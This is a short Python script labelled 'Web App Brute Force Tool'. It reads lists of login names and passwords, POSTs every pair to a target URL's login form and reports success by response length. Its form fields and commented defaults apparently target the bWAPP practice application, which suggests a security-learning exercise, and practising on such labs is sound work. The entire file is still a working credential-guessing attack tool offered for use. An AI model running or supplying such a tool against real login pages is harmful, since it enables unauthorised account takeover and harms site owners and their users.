#!/usr/bin/env python3

# importing the sys module so that we can
# use command line arguments for targetURL
import sys

# importing requests library to contact targetURL
import requests

# Banner
print("""
--------------------------------
    Web App Brute Force Tool    
--------------------------------
""")

if len(sys.argv) > 1:
	# Take in Target URL from command line argv[1]
	targetURL = sys.argv[1]

else:	
	targetURL = input("[>] Enter Target URL: ")
	
	
# Not a part of the else above this line
# Take input from end user for loginNames and passwords use files
loginNamesFile = input("[>] Enter Login Names File: ")
passwordsFile = input("[>] Enter Password File: ")

print(f"""

---------------------------------------
[*] Target URL: {targetURL}
[*] Login File: {loginNamesFile}
[*] Pass File: {passwordsFile}
---------------------------------------

""")

# Opening loginNamesFile and passwordsFile
with open(loginNamesFile, encoding="utf-8") as LNF:
	loginNames = LNF.readlines()
with open(passwordsFile, encoding="utf-8") as PWF:
	passwords = PWF.readlines()

try:
	# Login names and common passwords
	#loginNames = ["root", "admin", "guest", "test", "user1", "bee"]
	#passwords = ["password", "qwerty", "123456", "12345678", "123456789", "bug"]
	for name in loginNames:
		n = name.strip()
		for word in passwords:
			w = word.strip()
			# POST Data = login=admin&password=123456789&security_level=0&form=submit
			r = requests.post(targetURL, data={'login': n, 'password': w, 'security_level': '0', 'form': 'submit'})
			print(f"[*] Trying Creds ~> {n}:{w}")
			if len(r.text) > 4086:
				print(f"[!] SUCCESS!!! {n}:{w}")
				break

except:
	print("[!] Issue with Target URL")
	print("[!] Usage: ./brute-force.py https://target-url")
	print("[!] CHECK YOUR URL!")
